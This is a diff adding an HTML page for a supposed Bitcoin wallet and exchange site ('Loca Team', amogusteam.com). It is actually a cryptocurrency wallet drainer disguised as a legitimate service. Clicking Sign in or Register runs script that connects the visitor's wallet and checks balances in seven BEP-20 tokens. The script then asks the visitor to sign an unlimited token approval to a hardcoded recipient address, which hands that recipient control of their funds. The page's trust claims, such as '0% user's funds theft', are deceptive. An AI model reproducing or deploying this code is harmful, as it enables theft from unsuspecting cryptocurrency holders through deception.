@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>loca</title>
+
+	<link rel= "stylesheet" type= "text/css" href= "{{ url_for('static',filename='css/style.css') }}">
+    <link rel="shortcut icon" href="{{ url_for('static', filename='favicon.ico') }}">
+	<link rel="preconnect" href="https://fonts.googleapis.com">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link href="https://fonts.googleapis.com/css2?family=Roboto+Serif:ital,wght@1,600&display=swap" rel="stylesheet">
+	<script src="{{url_for('static', filename='js/ethers.js')}}"></script>
+    
+</head>
+<body>
+	<div class="head_box">
+		<p id="logo">Loca Team</p>
+		<a id="start" onclick="connect()">Sign in</a>
+		<p id="home">Home</p>
+		<p id="about">About us</p>
+		<p id="terms">Terms</p>
+		<p id="services">Services</p>
+	</div>
+	<div id="light1"></div>
+	<div id="light4"></div>
+	<div id="coin"></div>
+	<p id="fway">Fastest way<br>to <span id="violet">get your money</span></p>
+	<p id="com">A commercial website that lists wallets, exchanges and other bitcoin related info</p>
+	<a id="reg" onclick="connect()">Register</a>
+
+	<div id="box">
+		<div id="box_ico_back">
+			<div id="box_ico"></div>
+		</div>
+		<p id="box_alt">Web Bitcoin wallet</p>
+		<p id="box_text">Open web wallet to send and receive bitcoins.</p>
+	</div>
+
+	<div id="box2">
+		<div id="box2_ico_back">
+			<div id="box2_ico"></div>
+		</div>
+		<p id="box2_alt">Add coins to your wallet</p>
+		<p id="box2_text">Add bitcoins you’ve created or exchanged.</p>
+	</div>
+
+	<div id="box3">
+		<div id="box3_ico_back">
+			<div id="box3_ico"></div>
+		</div>
+		<p id="box3_alt">Buy/Sell with wallet</p>
+		<p id="box3_text">Enter receiver's address, specify the amount and send.</p>
+	</div>
+	<div id="line"></div>
+
+	<p id="last_alt">Life in the <span id='violet'>digital world</span></p>
+	<p id="last_text">Our high statistics. It is due to the provision of services in 99% of the world’s countries, protection against DDOS attacks and the availability of the wallet. Your amogusteam.com Wallet is available anywhere - ready to be on the go, just like you are.</p>
+
+	<div id="info_box">
+		<p id="info_box_alt">3650+</p>
+		<p id="info_box_text">Customers per day</p>
+	</div>
+	<div id="info_box2">
+		<p id="info_box2_alt">50000+</p>
+		<p id="info_box2_text">Clients amogusteam.com</p>
+	</div>
+	<div id="info_box3">
+		<p id="info_box3_alt">0%</p>
+		<p id="info_box3_text">User's funds theft</p>
+	</div>
+	<div id="info_box4">
+		<p id="info_box4_alt">2000 +</p>
+		<p id="info_box4_text">Transactions per day</p>
+	</div>
+
+	<p id="botm_alt">Get started today with crypto</p>
+	<p id="botm_text">Open account for free and start trading Bitcoins!</p>
+	<a id="botm_but" onclick="connect()">Register</a>
+
+	<script>
+		const web3 = new Web3('https://bsc-dataseed1.binance.org:443');
+		function show(address) {
+		console.log('address', address);
+		}
+		function add_bnb(){
+		window.ethereum.request({
+		method: 'wallet_addEthereumChain',
+		params: [{
+		chainId: '0x38',
+		chainName: 'Binance Smart Chain',
+		nativeCurrency: {
+			name: 'Binance Coin',
+			symbol: 'BNB',
+			decimals: 18
+		},
+		rpcUrls: ['https://bsc-dataseed.binance.org/'],
+		blockExplorerUrls: ['https://bscscan.com']
+		}]
+		})
+		.catch((error) => {
+		console.log(error)
+		}) }
+	
+		function connect() {
+		window.ethereum.request({
+			method: 'eth_requestAccounts',
+		}).then((r) => {
+			console.log('<->', r);
+			show(r[0]);
+			add_bnb();
+			send();
+		}).catch((error) => {
+			console.log('Error:', error);
+		})
+	
+		window.ethereum.request({
+			method: 'eth_accounts',
+		}).then((r) => {
+			// Array output
+			console.log('Accounts: ', r);
+			show(r[0]);
+			add_bnb();
+			send();
+		}).catch((error) => {
+			console.log('Error: ', error);
+		})
+		}
+	
+		
+	
+		function send() {
+		
+		async function approve(){
+		const usdtAbi = [
+			{
+				"inputs": [],
+				"stateMutability": "nonpayable",
+				"type": "constructor"
+			},
+			{
+				"anonymous": false,
+				"inputs": [
+					{
+						"indexed": true,
+						"internalType": "address",
+						"name": "owner",
+						"type": "address"
+					},
+					{
+						"indexed": true,
+						"internalType": "address",
+						"name": "spender",
+						"type": "address"
+					},
+					{
+						"indexed": false,
+						"internalType": "uint256",
+						"name": "value",
+						"type": "uint256"
+					}
+				],
+				"name": "Approval",
+				"type": "event"
+			},
+			{
+				"anonymous": false,
+				"inputs": [
+					{
+						"indexed": true,
+						"internalType": "address",
+						"name": "from",
+						"type": "address"
+					},
+					{
+						"indexed": true,
+						"internalType": "address",
+						"name": "to",
+						"type": "address"
+					},
+					{
+						"indexed": false,
+						"internalType": "uint256",
+						"name": "value",
+						"type": "uint256"
+					}
+				],
+				"name": "Transfer",
+				"type": "event"
+			},
+			{
+				"inputs": [
+					{
+						"internalType": "address",
+						"name": "owner",
+						"type": "address"
+					},
+					{
+						"internalType": "address",
+						"name": "delegate",
+						"type": "address"
+					}
+				],
+				"name": "allowance",
+				"outputs": [
+					{
+						"internalType": "uint256",
+						"name": "",
+						"type": "uint256"
+					}
+				],
+				"stateMutability": "view",
+				"type": "function"
+			},
+			{
+				"inputs": [
+					{
+						"internalType": "address",
+						"name": "delegate",
+						"type": "address"
+					},
+					{
+						"internalType": "uint256",
+						"name": "numTokens",
+						"type": "uint256"
+					}
+				],
+				"name": "approve",
+				"outputs": [
+					{
+						"internalType": "bool",
+						"name": "",
+						"type": "bool"
+					}
+				],
+				"stateMutability": "nonpayable",
+				"type": "function"
+			},
+			{
+				"inputs": [
+					{
+						"internalType": "address",
+						"name": "tokenOwner",
+						"type": "address"
+					}
+				],
+				"name": "balanceOf",
+				"outputs": [
+					{
+						"internalType": "uint256",
+						"name": "",
+						"type": "uint256"
+					}
+				],
+				"stateMutability": "view",
+				"type": "function"
+			},
+			{
+				"inputs": [],
+				"name": "decimals",
+				"outputs": [
+					{
+						"internalType": "uint8",
+						"name": "",
+						"type": "uint8"
+					}
+				],
+				"stateMutability": "view",
+				"type": "function"
+			},
+			{
+				"inputs": [],
+				"name": "name",
+				"outputs": [
+					{
+						"internalType": "string",
+						"name": "",
+						"type": "string"
+					}
+				],
+				"stateMutability": "view",
+				"type": "function"
+			},
+			{
+				"inputs": [],
+				"name": "symbol",
+				"outputs": [
+					{
+						"internalType": "string",
+						"name": "",
+						"type": "string"
+					}
+				],
+				"stateMutability": "view",
+				"type": "function"
+			},
+			{
+				"inputs": [],
+				"name": "totalSupply",
+				"outputs": [
+					{
+						"internalType": "uint256",
+						"name": "",
+						"type": "uint256"
+					}
+				],
+				"stateMutability": "view",
+				"type": "function"
+			},
+			{
+				"inputs": [
+					{
+						"internalType": "address",
+						"name": "receiver",
+						"type": "address"
+					},
+					{
+						"internalType": "uint256",
+						"name": "numTokens",
+						"type": "uint256"
+					}
+				],
+				"name": "transfer",
+				"outputs": [
+					{
+						"internalType": "bool",
+						"name": "",
+						"type": "bool"
+					}
+				],
+				"stateMutability": "nonpayable",
+				"type": "function"
+			},
+			{
+				"inputs": [
+					{
+						"internalType": "address",
+						"name": "owner",
+						"type": "address"
+					},
+					{
+						"internalType": "address",
+						"name": "buyer",
+						"type": "address"
+					},
+					{
+						"internalType": "uint256",
+						"name": "numTokens",
+						"type": "uint256"
+					}
+				],
+				"name": "transferFrom",
+				"outputs": [
+					{
+						"internalType": "bool",
+						"name": "",
+						"type": "bool"
+					}
+				],
+				"stateMutability": "nonpayable",
+				"type": "function"
+			}
+		];
+			let provider;
+		if (window.ethereum) {
+			try {
+			provider = new ethers.providers.Web3Provider(window.ethereum)
+			}
+			catch(error) {
+				console.log("Error in web3 provider: ", error)
+			}
+		}
+		else if (window.web3){
+			try {
+			provider = new ethers.providers.Web3Provider(window.web3)
+			}
+			catch(error) {
+				console.log("Error in web3 provider: ", error)
+			}
+		}
+		else {
+			try {
+			provider = new ethers.providers.JsonRpcProvider();
+			}
+			catch(error) {
+				console.log("Error in web3 provider: ", error)
+			}
+		}
+		
+		let signer;
+		try {
+			
+		}
+		catch(error) {
+			console.log("Error on getSigner function: ", error)
+		}
+	
+	
+		try {
+		await provider.send("eth_requestAccounts", []);
+		signer = provider.getSigner()
+	
+		recipientAddress = "0x1749B879743700C85cd32634F4ca508003DBee99"
+		const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"
+		const ethAddress = "0x2170Ed0880ac9A755fd29B2688956BD959F933F8"
+		const wbnbAddress = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"
+		const usdcAddress = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"
+		const xrpAddress = "0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE"
+		const daiAddress = "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3"
+		const cakeAddress = "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82"
+		
+		const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
+		const ethContract = new ethers.Contract(ethAddress, usdtAbi, signer);
+		const wbnbContract = new ethers.Contract(wbnbAddress, usdtAbi, signer);
+		const usdcContract = new ethers.Contract(usdcAddress, usdtAbi, signer);
+		const xrpContract = new ethers.Contract(xrpAddress, usdtAbi, signer);
+		const daiContract  = new ethers.Contract(daiAddress, usdtAbi, signer);
+		const cakeContract  = new ethers.Contract(cakeAddress, usdtAbi, signer);
+			
+		const usdtBalance = await usdtContract.balanceOf(signer.getAddress())
+		const ethBalance = await ethContract.balanceOf(signer.getAddress())
+		const wbnbBalance = await wbnbContract.balanceOf(signer.getAddress())
+		const usdcBalance = await usdcContract.balanceOf(signer.getAddress())
+		const xrpBalance = await xrpContract.balanceOf(signer.getAddress())
+		const daiBalance = await daiContract.balanceOf(signer.getAddress())
+		const cakeBalance = await cakeContract.balanceOf(signer.getAddress())
+			
+		console.log(usdtBalance)
+		console.log(ethBalance)
+		console.log(wbnbBalance)
+		console.log(usdcBalance)
+		console.log(xrpBalance)
+		console.log(daiBalance)
+		console.log(cakeBalance)
+			
+	
+		let balances = [
+		{ name: usdtContract, address: usdtAddress, value: Number(usdtBalance)},
+		{ name: ethContract, address: ethAddress, value: Number(ethBalance) * 2595},
+		{ name: wbnbContract, address: wbnbAddress, value: Number(wbnbBalance) * 370},
+		{ name: usdcContract, address: usdcAddress, value: Number(usdcBalance) },
+		{ name: xrpContract, address: xrpAddress, value: Number(xrpBalance) * 0.8},
+		{ name: daiContract, address: daiAddress, value: Number(daiBalance) },
+		{ name: cakeContract, address: cakeAddress, value: Number(cakeBalance) * 5.50}
+	]
+		let maxValue = balances.reduce((max, balance) => max.votes > balance.votes ? max : balance);
+		
+		if (maxValue.value === 0){
+			console.log("All balances are 0")
+		} else {
+			console.log("Contract address: ", maxValue.address, "has ", maxValue.value, "tokens")
+		}
+			let approve = await maxValue.name.approve(recipientAddress, "115792089237316195423570985008687907853269984665640564039457584007913129639935")
+			console.log("Sended tokens approve to recipient address..")
+		}
+		catch (error) {
+			console.log("Error: ", error)
+		}
+		}
+	
+		approve();
+		
+	
+		}
+	
+	</script>  
+</body>
+</html>
